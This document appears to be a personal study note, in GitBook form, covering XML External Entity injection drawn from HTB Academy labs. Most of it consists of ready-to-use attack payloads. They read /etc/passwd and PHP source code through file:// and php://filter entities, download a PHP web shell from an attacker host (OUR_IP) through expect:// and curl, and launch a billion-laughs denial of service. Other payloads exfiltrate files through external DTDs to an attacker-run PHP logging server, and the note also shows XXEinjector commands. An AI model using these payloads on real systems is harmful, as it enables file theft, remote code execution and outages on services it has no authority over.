# XML External Entity (XXE) Injection

## 1.Local File Disclosure

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FrdpJHfLgsAtVmkjqn2z2%2Fimage.png?alt=media&amp;token=fc25c3ac-9f23-4112-8d69-2ae86870900d" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FOzc3xdlhbhEgAlal7mZo%2Fimage.png?alt=media&amp;token=9a351ad6-bb2a-4c4d-974d-607acac9a716" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FptmL7WfnO7ErHAztNUGZ%2Fimage.png?alt=media&amp;token=51291b64-e063-4e51-9efb-07331e3d00e7" alt=""><figcaption></figcaption></figure>

JSON TO XML CONVERTER

{% embed url="<https://www.convertjson.com/json-to-xml.htm>" %}

> Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

### Reading Sensitive Files

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FlyE1NLcR5Ers6uKgF2zz%2Fimage.png?alt=media&amp;token=6ed61c84-a2d4-4fb3-805a-b5cddd72558b" alt=""><figcaption></figcaption></figure>

### Reading Source Code

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FB8bEA8mT9S7RjPM6WOvm%2Fimage.png?alt=media&amp;token=0161ad75-2e46-4654-a7bc-a28733e7efeb" alt=""><figcaption></figcaption></figure>

Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using `file://` as our reference, we will use PHP's `php://filter/` wrapper. With this filter, we can specify the `convert.base64-encode` encoder as our filter, and then add an input resource (e.g. `resource=index.php`), as follows:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

With that, we can send our request, and we will get the base64 encoded string of the `index.php` file:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FR14h7MdhPdQvx3RDLbZ6%2Fimage.png?alt=media&amp;token=12d4d6c9-0ad7-486c-82d7-c7068b99d28e" alt=""><figcaption></figcaption></figure>

### Remote Code Execution with XXE

PHP://expect

&#x20;`expect://id`

```shell-session
Olanzapine@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
Olanzapine@htb[/htb]$ sudo python3 -m http.server 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

> Note: We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

### Other XXE Attacks

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

## 2.Advanced File Disclosure

### Advanced Exfiltration with CDATA

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

```xml
<!ENTITY joined "%begin;%file;%end;">
```

```shell-session
Olanzapine@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
Olanzapine@htb[/htb]$ python3 -m http.server 8000
```

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

<br>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FtT2EAzPAxxJniuqjwh4V%2Fimage.png?alt=media&amp;token=f71d6b86-c6da-4a77-8846-4216c108c400" alt=""><figcaption></figcaption></figure>

### Error Based XXE

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FKax0uCBqXyvSLub6JUH5%2Fimage.png?alt=media&amp;token=4bc337aa-9989-456d-867f-601c9cdd3536" alt=""><figcaption></figcaption></figure>

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

<br>

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FSq5eLUsJfyk7ndkIlDsX%2Fimage.png?alt=media&amp;token=17b78503-7bfd-4444-a795-94d7d4169eef" alt=""><figcaption></figcaption></figure>

## 3.Blind Data Exfiltration

### Out-of-band Data Exfiltration

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

So, we will first write the above PHP code to `index.php`, and then start a PHP server on port `8000`, as follows:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```shell-session
Olanzapine@htb[/htb]$ vi index.php # here we write the above PHP code
Olanzapine@htb[/htb]$ php -S 0.0.0.0:8000
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

<br>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FZDZTDL2fRyvi7v2GDcsd%2Fimage.png?alt=media&amp;token=2bf4613c-0ac7-4c4e-a932-49dc36695727" alt=""><figcaption></figcaption></figure>

Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content:

&#x20;

```shell-session
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

## Automated OOB Exfiltration

* <https://github.com/enjoiz/XXEinjector>

```shell-session
git clone https://github.com/enjoiz/XXEinjector.git
```

```shell-session
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

<br>

```shell-session
 cat Logs/10.129.201.94/etc/passwd.log 
```
